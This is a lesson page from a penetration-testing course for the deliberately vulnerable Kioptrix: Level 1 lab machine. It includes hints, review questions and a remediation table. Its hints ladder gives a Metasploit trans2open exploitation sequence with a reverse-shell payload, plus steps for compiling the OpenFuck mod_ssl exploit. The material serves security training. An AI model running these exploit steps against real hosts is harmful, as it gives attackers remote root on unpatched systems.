# Machine 5 — Kioptrix: Level 1 (#1)

> **Position:** 5 of 13 · the first **Band 3** box · **Band 3 — Easy** (global rank **046** of 708)
> **Full writeup:** [`labs/3-046-kioptrix-level-1-1/README.md`](../../labs/3-046-kioptrix-level-1-1/README.md)

| | |
| --- | --- |
| **Machine** | Kioptrix: Level 1 (#1) |
| **Author** | loneferret |
| **Released** | 17 February 2010 |
| **Target** | Linux, Red Hat era — Apache **1.3.20** + mod_ssl **2.8.4** + OpenSSL **0.9.6b**, Samba **2.2.1a**, OpenSSH **2.9p2** |
| **VulnHub** | [entry/kioptrix-level-1-1,22](https://vulnhub.com/entry/kioptrix-level-1-1,22/) |
| **Estimated time** | 4–6 hours |

---

## Why this machine is here

This is the **only 2010-era machine in the path**, and it is here on purpose. Every
other box you have met is a modern Linux with a web application on it. Kioptrix has
none of that: it is a pile of ancient network services, and it teaches a discipline
the modern boxes cannot —

> **Getting an exact version string, finding the right published exploit for that
> version *and* that architecture *and* that distribution, and making 20-year-old
> exploit code actually compile and run.**

That is what exploiting legacy infrastructure looks like in practice, and it is
mostly *build engineering*, not cleverness. It is also the box where you first meet a
**buffer overflow** — conceptually, without having to write one.

## Learning objectives

1. Enumerate **non-web services** properly: SMB/NetBIOS, `rpcbind`, ancient SSH.
2. Extract **exact version strings** from banners — and understand why `Samba 2.2.1a`
   is a completely different target from `Samba 2.2.8`.
3. Use **`searchsploit`** as a research tool: `-t` (titles only), `-m` (mirror),
   `-x` (examine), `-p` (path), `--update`.
4. Understand **what a remote buffer overflow is**, at a conceptual level — without
   needing to write one.
5. Drive Metasploit against a legacy target: choosing the right **target offset**
   and **payload architecture**.
6. **Compile an old exploit** and cope with modern-toolchain friction.
7. Accept that a legacy box may **crash**, and use snapshots accordingly.
8. Compare two independent routes to root on the same machine.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| **Remote buffer overflow (SMB)** | Samba `trans2open`, **CVE-2003-0201**, Samba 2.2.0–2.2.8 |
| **Remote buffer overflow (HTTPS)** | Apache mod_ssl / OpenSSL — "**OpenFuck**", **CVE-2002-0082** |
| Legacy protocol exposure | SMBv1 on 139/445; `rpc.statd` via port 111 |
| Ancient SSH | OpenSSH **2.9p2**, protocol 1.99 |
| Version-targeted research | `searchsploit samba 2.2` → `linux/remote/10.c`, `linux/remote/22.c` |
| Exploit build engineering | `gcc`, target codes (e.g. `0x6b` for Red Hat 7.2), 32-bit payloads |

**Direct root.** Unlike every other machine so far, the exploit itself yields
`uid=0` — there is no separate privilege-escalation stage.

## Read first

- [03 — Service and Network Attacks](../03-Service-and-Network-Attacks.md) **§2**
  (SMB) and **§5** (legacy services) — §5 is written for this machine.
- [01 — Foundations](../01-Foundations-Networking-and-Recon.md) §5–§6, on reading
  banners and what `-sV` actually does.
- [06 — Shells, Persistence and Escapes](../06-Shells-Persistence-and-Escapes.md) §1.
- [00 — Before You Start](../00-Before-You-Start.md) §4 — **snapshot before you
  start.** This box can crash.

## Before you start — answer these

1. Why is the difference between `Samba 2.2.1a` and `Samba 2.2.8` worth more than the
   difference between `Samba 2.2` and `Samba 4.x`?
2. What does a **buffer overflow** do, in one sentence, without using the word
   "memory"?
3. What is a **target offset** in an exploit, and why does the target's *distribution*
   matter?
4. Why might an exploit written for a 32-bit x86 host fail on your 64-bit Kali, and
   what do you do about it?
5. Which is riskier to run against a live VM — a remote overflow or a local one? Why?

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Run a full scan with versions and default scripts:

```bash
sudo nmap -sC -sV -p- -oA scans/kioptrix TARGET
```

Write down **every** version string. Then, for each one, run `searchsploit`. Do not
pick an exploit yet — just build the list. One of these services is dramatically
older than the others and has a famous remote-root bug.
</details>

<details>
<summary><strong>Rung 2 — which service</strong></summary>

You should see roughly:

| Port | Service |
| --- | --- |
| 22 | OpenSSH **2.9p2** (protocol 1.99) |
| 80 | Apache **1.3.20** with mod_ssl/**2.8.4**, OpenSSL/**0.9.6b** |
| 111 | `rpcbind` |
| 139, 445 | Samba **2.2.1a** |

Research each:

```bash
searchsploit -t samba 2.2
searchsploit -t apache mod_ssl
searchsploit -t openssl 0.9.6
```

The **canonical beginner route is the Samba `trans2open` overflow (CVE-2003-0201)**.
The Apache/mod_ssl "**OpenFuck**" bug (CVE-2002-0082) is the alternative.
</details>

<details>
<summary><strong>Rung 3 — the Samba route via Metasploit</strong></summary>

```bash
sudo msfdb init            # first run only
msfconsole -q
search trans2open
use exploit/linux/samba/trans2open
info                       # READ THIS — targets and caveats
show options
set RHOSTS TARGET
set LHOST 192.168.56.10    # YOUR lab interface
show targets               # pick Linux x86
set PAYLOAD linux/x86/shell_reverse_tcp
exploit
```

If it fails, check: `LHOST` must be your **host-only/NAT** interface IP, not your
Wi-Fi IP; the target may need a specific offset; and the VM may have crashed — check
the console and restore the snapshot.
</details>

<details>
<summary><strong>Rung 4 — the manual route, and the OpenFuck alternative</strong></summary>

**Manual trans2open:** `searchsploit -m linux/remote/10.c` (or `22.c`), read it,
edit `RHOST` and the target offset, compile with `gcc 10.c -o t2o`, run it. Expect
compile friction — this code is from 2003.

**OpenFuck (CVE-2002-0082):** target is the exact triple Apache **1.3.20** +
mod_ssl **2.8.4** + OpenSSL **0.9.6b**. `searchsploit apache mod_ssl` → get
`OpenFuck.c` → compile → run with the correct **target code** for the distribution
(e.g. `0x6b` for Red Hat 7.2) and the target IP. On some builds it drops you to the
`apache` user rather than root, needing further escalation — which is itself a useful
lesson: *read what the exploit claims before you assume it gives you root.*

**There is no privilege-escalation stage on the canonical route** — `trans2open`
lands you directly as `uid=0(root)`. Confirm with `id`, then look for flags:

```bash
ls -la /root/
find / -name '*flag*' -type f 2>/dev/null | head -15
```
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. Host discovery → `nmap -sC -sV -p-` → 22 (OpenSSH 2.9p2), 80 (Apache 1.3.20 /
   mod_ssl 2.8.4 / OpenSSL 0.9.6b), 111 (`rpcbind`), 139 & 445 (**Samba 2.2.1a**).
2. `searchsploit samba 2.2` → **`trans2open` overflow, CVE-2003-0201**
   (`linux/remote/10.c`, `linux/remote/22.c`).
3. Metasploit `exploit/linux/samba/trans2open`, `PAYLOAD
   linux/x86/shell_reverse_tcp`, correct `RHOSTS`/`LHOST` → **immediate root**.
4. `id` → `uid=0(root) gid=0(root)`. No escalation stage needed.
5. **Alternative:** OpenFuck (CVE-2002-0082) against Apache/mod_ssl/OpenSSL with the
   right target code (`0x6b` for Red Hat 7.2) — may land you as `apache` first.
</details>

## After you finish — review questions

1. Which route did you use, and what did the *other* route teach you that yours did not?
2. Why did the exploit give you root directly here, when Machines 1–4 all needed a
   separate escalation stage? What does that tell you about buffer overflows in
   network services?
3. What exactly did you have to change in the exploit before it worked? List each
   parameter and why.
4. Did the box crash at any point? What did that teach you about snapshotting?
5. SMBv1 is enabled. Independent of the buffer overflow, why is that a finding?
6. OpenSSH 2.9p2 supports protocol 1.99. What is wrong with SSH protocol 1, and what
   should the configuration say instead?
7. If a client showed you this exact stack today, what would your **first
   recommendation** be — and why is "patch Samba" not sufficient?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| Samba 2.2.1a with `trans2open` | **Replace the software.** There is no configuration that fixes a 2003 remote-root overflow |
| Apache 1.3.20 + mod_ssl 2.8.4 | Upgrade. Apache 1.3 has been EOL since 2010 |
| OpenSSL 0.9.6b | Upgrade. This version predates essentially every modern TLS control |
| OpenSSH 2.9p2, protocol 1.99 | Upgrade; set `Protocol 2` explicitly; disable weak ciphers and DSA keys |
| SMBv1 / NetBIOS exposed | Disable SMBv1 entirely; block 139/445 at the perimeter unless required |
| `rpcbind` + `rpc.statd` exposed | Bind to localhost or firewall it; historic NFS RPC services have been exploited for decades |
| No patch management at all | The root cause of every finding above. Implement vulnerability scanning with version detection on a schedule |
| Build tooling reachable | Irrelevant here — the exploit was remote. But note that the *research* workflow (`searchsploit`) is exactly what an attacker runs against your banners |

**The single biggest lesson:** *banner suppression is not patching.* Hiding
`Server: Apache/1.3.20` makes an attacker's job harder, but the vulnerability is
still there and still exploitable. Only removing or updating the software fixes it.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 4 — DC: 2](04-dc-2.md) · next: [Machine 6 — bossplayersCTF: 1](06-bossplayersctf-1.md) · full writeup: [`labs/3-046-kioptrix-level-1-1`](../../labs/3-046-kioptrix-level-1-1/README.md)._
